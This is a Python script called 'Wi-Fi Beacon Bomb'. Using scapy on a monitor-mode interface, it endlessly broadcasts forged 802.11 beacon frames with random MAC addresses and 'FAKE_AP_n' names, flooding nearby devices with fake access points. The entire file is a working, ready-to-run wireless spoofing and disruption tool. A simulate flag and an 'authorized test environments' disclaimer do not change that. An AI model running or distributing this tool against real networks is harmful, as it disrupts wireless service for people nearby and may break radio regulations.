#!/usr/bin/env python3
import os
import sys
import time
import argparse
import random as rand
from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Elt, sendp, get_if_list  # type: ignore


DEFAULT_IFACE = os.environ.get("WIFI_BOMB_IFACE", "wlan0mon")
DEFAULT_TOTAL = int(os.environ.get("WIFI_BOMB_TOTAL", "1000"))
DEFAULT_INTERVAL = float(os.environ.get("WIFI_BOMB_INTERVAL", "0.005"))


def iface_exists(iface: str) -> bool:
    try:
        return iface in get_if_list()
    except Exception:
        return False


def random_mac() -> str:
    # Locally administered MAC: first byte = 02
    return "02:00:00:{:02x}:{:02x}:{:02x}".format(
        rand.randint(0, 255), rand.randint(0, 255), rand.randint(0, 255)
    )


def make_beacon(ssid: str, mac: str):
    return (
        RadioTap()
        / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
        / Dot11Beacon(cap="ESS")
        / Dot11Elt(ID="SSID", info=ssid)
    )


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="Wi‑Fi Beacon Bomb - fake AP beacon broadcaster (use responsibly)")
    p.add_argument("--iface", default=DEFAULT_IFACE, help="monitor-mode interface to use (env: WIFI_BOMB_IFACE)")
    p.add_argument("--total", type=int, default=DEFAULT_TOTAL, help="number of fake APs per cycle (env: WIFI_BOMB_TOTAL)")
    p.add_argument("--interval", type=float, default=DEFAULT_INTERVAL, help="seconds between packets (env: WIFI_BOMB_INTERVAL)")
    p.add_argument("--simulate", action="store_true", help="simulate only; do not transmit packets")
    p.add_argument("--verbose", action="store_true", help="print per-packet info to stdout")
    return p.parse_args()


def main():
    args = parse_args()
    iface = args.iface
    total = args.total
    interval = args.interval
    simulate = args.simulate
    verbose = args.verbose

    if not simulate and not iface_exists(iface):
        print(f"[!] Interface {iface} not found. Available interfaces: {get_if_list()}")
        sys.exit(1)

    print(f"[*] Starting Wi‑Fi Beacon Bomb on interface={iface} total={total} interval={interval}s simulate={simulate}")
    print("[!] Use only in authorized test environments. The author is not responsible for misuse.")

    counter = 0
    try:
        while True:
            for i in range(total):
                ssid = f"FAKE_AP_{i}"
                mac = random_mac()
                pkt = make_beacon(ssid, mac)

                if simulate:
                    if verbose:
                        print(f"[SIM] would send SSID={ssid} BSSID={mac}")
                else:
                    sendp(pkt, iface=iface, count=1, verbose=False)
                    if verbose:
                        print(f"[TX ] sent SSID={ssid} BSSID={mac}")

                counter += 1
                if interval > 0:
                    time.sleep(interval)

    except KeyboardInterrupt:
        print("\n[+] Stopped by user (KeyboardInterrupt). Exiting cleanly.")
    except Exception as e:
        print(f"[!] Unexpected error: {e}", file=sys.stderr)
        raise


if __name__ == "__main__":
    main()
